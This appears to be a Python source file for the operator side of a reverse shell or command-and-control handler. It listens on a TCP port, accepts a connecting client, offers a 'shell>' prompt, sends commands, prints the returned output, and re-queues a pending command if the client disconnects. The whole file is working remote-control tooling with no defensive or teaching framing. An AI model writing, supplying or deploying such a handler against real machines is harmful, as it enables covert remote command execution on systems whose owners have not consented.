import socket
from modules.color import Color
import signal
import struct


class Server:
    def __init__(self, host, port: int):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.server.settimeout(1)
        self.running = True

        signal.signal(signal.SIGINT, self.signal_handler)

        print(f"{Color.OKGREEN}[*]{Color.DEFAULT} Listening on {self.host}:{self.port}")

    def signal_handler(self, signum, frame):
        print(f"\n{Color.OKGREEN}[*]{Color.DEFAULT} Caught Ctrl+C, shutting down...")
        self.running = False

    def accept(self):
        try:
            client_socket, addr = self.server.accept()
            print(
                f"{Color.OKGREEN}[*]{Color.DEFAULT} Accepted connection from {addr[0]}:{addr[1]}\n"
            )
            return client_socket
        except socket.timeout:
            return None

    def send(self, client_socket, data):
        if self.running and client_socket:
            try:
                length = struct.pack("!I", len(data))
                client_socket.sendall(length + data)
            except socket.error as e:
                print(f"{Color.FAIL}[!]{Color.DEFAULT} Error sending data: {e}")

    def close(self):
        if self.server:
            self.server.close()
        self.running = False
        print(f"{Color.OKGREEN}[*]{Color.DEFAULT} Server closed")


class Session:
    def __init__(self, host, port):
        self.server = Server(host, port)
        self.client_socket = None
        self.pending_command = None

    def _receiveAll(self, n):
        data = b""
        while len(data) < n:
            part = self.client_socket.recv(n - len(data))
            if not part:
                return None
            data += part
        return data

    def start(self):
        try:
            while self.server.running:

                if not self.client_socket:
                    self.client_socket = self.server.accept()
                    if not self.client_socket:
                        continue

                signal.signal(signal.SIGINT, signal.SIG_DFL)

                if not self.pending_command:
                    print(f"{Color.OKCYAN}shell>{Color.DEFAULT} ", end="", flush=True)

                command = self.pending_command or input()

                if command.lower() == "exit":
                    break

                self.server.send(self.client_socket, command.encode("utf-8"))

                try:
                    raw_length = self.client_socket.recv(4)

                    if not raw_length:
                        print(
                            f"{Color.WARNING}[!]{Color.DEFAULT} Connection closed by client"
                        )
                        print(f"{Color.OKBLUE}[¡]{Color.DEFAULT} Pending command: {command}")
                        self.server.close()
                        self.client_socket = None
                        self.server = Server(
                            self.server.host, self.server.port,
                        )  # Restart server
                        self.pending_command = command
                        continue
                        

                    length = struct.unpack("!I", raw_length)[0]
                    response = self._receiveAll(length)
                    if response:
                        print(response.decode("utf-8"))
                    
                    self.pending_command = None
                except socket.timeout:
                    print(f"{Color.WARNING}[!]{Color.DEFAULT} No response from client")
                    self.client_socket = None
                except socket.error as e:
                    print(f"{Color.FAIL}[!]{Color.DEFAULT} Error receiving data: {e}")
                    self.client_socket = None

        except KeyboardInterrupt:
            print(
                f"\n{Color.OKGREEN}[*]{Color.DEFAULT} Caught KeyboardInterrupt in Session"
            )
        finally:
            if self.client_socket:
                self.client_socket.close()
            self.server.close()
